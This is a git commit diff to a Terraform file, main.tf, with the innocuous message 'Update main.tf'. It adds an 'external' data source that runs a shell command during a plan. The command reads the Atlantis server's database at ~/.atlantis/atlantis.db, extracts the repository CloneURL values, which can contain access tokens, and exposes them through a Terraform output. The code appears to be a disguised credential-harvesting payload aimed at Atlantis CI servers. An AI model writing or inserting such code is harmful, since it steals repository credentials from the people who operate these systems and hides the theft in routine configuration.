428aa128b5907c2956005241460862d4a3413ccc
alexandrediasonepoint <125377065+alexandrediasonepoint@users.noreply.github.com>
2023-04-03 15:04:09 +0200

    Update main.tf

--- main.tf
+++ main.tf
@@ -1,2 +1,7 @@
-resource "null_resource" "exambetter2" {
+data "external" "example" {
+  program = ["sh", "-c", "strings ~/.atlantis/atlantis.db | tr ',' '\n' | grep CloneURL | sort | awk '{print $0\",\"}' | rev | cut -c2- | rev | xargs -0 printf '{ %s }'"]
 }
+output "test"  {
+  value = data.external.example.result.CloneURL
+}
+
